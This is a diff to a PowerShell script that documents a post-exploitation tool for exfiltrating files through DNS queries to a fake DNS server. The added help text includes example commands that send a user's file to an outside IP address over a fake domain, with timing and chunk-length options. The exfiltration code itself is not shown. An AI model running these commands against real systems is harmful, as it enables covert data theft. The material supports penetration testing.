@@ -1,13 +1,41 @@
 <#
 .SYNOPSIS
+Post-exploitation tool to execute DNS exfiltration to your pentesting machine
 
 .DESCRIPTION
+Post-exploitation tool to execute DNS exfiltration to your pentesting machine
+At leats three parameters are needed:
+- Specify DNS resolver as Server parameter
+- Specify filename
+- Specify the fake or legit domain you want to query
+The fakeDNS-server must be listening on your machine
+
+.PARAMETER Server
+(Required) IP address of the listening DNS resolver
+
+.PARAMETER File
+(Required) Path to the file to exfiltrate through DNS queries
+
+.PARAMETER Domain
+(Required) Fake or legit domain for DNS queries. Your fakeDNS-server will answer to both
+
+.PARAMETER Timeout
+(Optional) Set a timeout between queries to slow down or speed up exfiltration. Default value is 2s
+
+.PARAMETER Hashing
+(Optional) Include hash calculation in exfiltration for integrity purposes
+
+.PARAMETER Length
+(Optional) Set the third domain length. Default value is 16
 
 .EXAMPLE
+.\dnsexfil.ps1 -Server 10.10.80.129 -d fakedomain.com -File C:\Users\Name\file.txt
 
 .EXAMPLE
+.\dnsexfil.ps1 -Server 10.10.80.129 -d fakedomain.com -File C:\Users\Name\file.txt -Length 32 -Timeout 10 -Hashing
 
 .LINK
+.
 
 #>
 
@@ -72,7 +100,7 @@ if (-not $Length) {
 }
 
 if (-not $Timeout) {
-    $Timeout = 0.1
+    $Timeout = 2
 }
 
 
